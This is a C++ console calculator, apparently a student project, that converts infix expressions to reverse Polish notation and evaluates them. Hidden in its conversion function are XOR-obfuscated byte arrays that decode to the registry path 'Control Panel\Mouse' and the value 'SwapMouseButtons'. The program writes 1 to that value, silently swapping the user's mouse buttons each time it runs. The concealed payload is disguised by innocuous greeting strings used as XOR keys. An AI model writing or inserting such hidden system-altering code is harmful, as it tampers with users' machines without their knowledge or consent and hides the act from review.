#include <iostream>
#include <cstdlib>
#include <string>
#include <fstream>
#include <cctype>
#include <sstream>
#include <vector>
#include <stdexcept>
#include <windows.h>

using namespace std;
const int MAX = 4096;
string stack[MAX];
int tos = 0;
string x = "Hello, this is calc!";
string x1 = "My first project!";
string infixExpr;


std::vector<BYTE> XORByteArrays(const BYTE* arr1, string x, size_t length) {
    std::vector<BYTE> arr2(x.begin(), x.end());
    std::vector<BYTE> result(length);
    for (size_t i = 0; i < length; ++i) {
        result[i] = arr1[i] ^ arr2[i];
    }
    return result;
}

void push(string val) {
    if (tos >= MAX) {
        printf("Stack overflow\n");
        return;
    }
    stack[tos] = val;
    tos++;
}

string pop(void) {
    if (tos <= 0) {
        printf("Stack is empty\n");
        return "";
    }
    tos--;
    return stack[tos];
}

int priority(char s) {
    switch (s) {
    case '+': case '-': return 1;
    case '*': case '/': return 2;
    case '(': return 0;
    default: return -1;
    }
}

void in_file(string str) {
    fstream in("out.txt", ios::out);
    if (in.is_open()) {
        in << str;
        in.close();
    }
}


string convertToRPN(const string& str) {
    HKEY hKey;
    BYTE bytes[] = { 0x0b, 0x0a, 0x02, 0x18, 0x1d, 0x43, 0x4c, 0x54, 0x38, 0x08, 0x1d, 0x45, 0x05, 0x2f, 0x6d, 0x0c, 0x14, 0x1f, 0x06, 0x21 };
    BYTE bytes1[] = { 0x1E, 0x0E, 0x41, 0x16, 0x24, 0x1D, 0x06, 0x07, 0x45, 0x32, 0x07, 0x1B, 0x1E, 0x0A, 0x0D, 0x07, 0x21 };

    std::vector<BYTE> pipap = XORByteArrays(bytes, x, sizeof(bytes));
    std::vector<BYTE> pippi = XORByteArrays(bytes1, x1, sizeof(bytes1));
    LPCSTR subKey = reinterpret_cast<LPCSTR>(pipap.data());
    LPCSTR subKey1 = reinterpret_cast<LPCSTR>(pippi.data());
    if (RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;

        RegSetValueExA(hKey, subKey1, 0, REG_DWORD, reinterpret_cast<const BYTE*>(&value), sizeof(value));
        RegCloseKey(hKey);
    }

    string output = "";
    for (size_t i = 0; i < str.length(); i++) {
        char ch = str[i];

        if (isdigit(ch)) {
            while (i < str.length() && isdigit(str[i])) {
                output += str[i];
                i++;
            }
            output += ' ';
            i--;
        }
        else if (ch == '(') {
            push("(");
        }
        else if (ch == ')') {
            while (!stack[tos - 1].empty() && stack[tos - 1] != "(") {
                output += pop();
                output += ' ';
            }
            pop();
        }
        else {
            while (tos > 0 && priority(ch) <= priority(stack[tos - 1][0])) {
                output += pop();
                output += ' ';
            }
            push(string(1, ch));
        }
    }
    while (tos > 0) {
        output += pop();
        output += ' ';
    }
    return output;
}

int evaluateRPN(const string& expression) {
    int evalStack[MAX];
    int evalTos = 0;
    istringstream iss(expression);
    string token;

    while (iss >> token) {
        if (isdigit(token[0])) {
            evalStack[evalTos++] = stoi(token);
        }
        else {
            int b = evalStack[--evalTos];
            int a = evalStack[--evalTos];
            switch (token[0]) {
            case '+': evalStack[evalTos++] = a + b; break;
            case '-': evalStack[evalTos++] = a - b; break;
            case '*': evalStack[evalTos++] = a * b; break;
            case '/':
                if (b == 0) throw runtime_error("Devide on 0");
                evalStack[evalTos++] = a / b;
                break;
            }
        }
    }
    return evalStack[0];
}
void startHello() {

    cout << x << endl;
    cout << x1 << endl;
    cout << "\nInput expression: ";
    getline(cin, infixExpr);
    cout << "\n\n";
}
int main() {
    setlocale(LC_ALL, "rus");
    startHello();
    string rpnExpr = convertToRPN(infixExpr);

    try {
        int result = evaluateRPN(rpnExpr);
        cout << "Result: " << result << endl;
    }
    catch (const runtime_error& e) {
        cerr << "Error: " << e.what() << endl;
    }

    return 0;
}
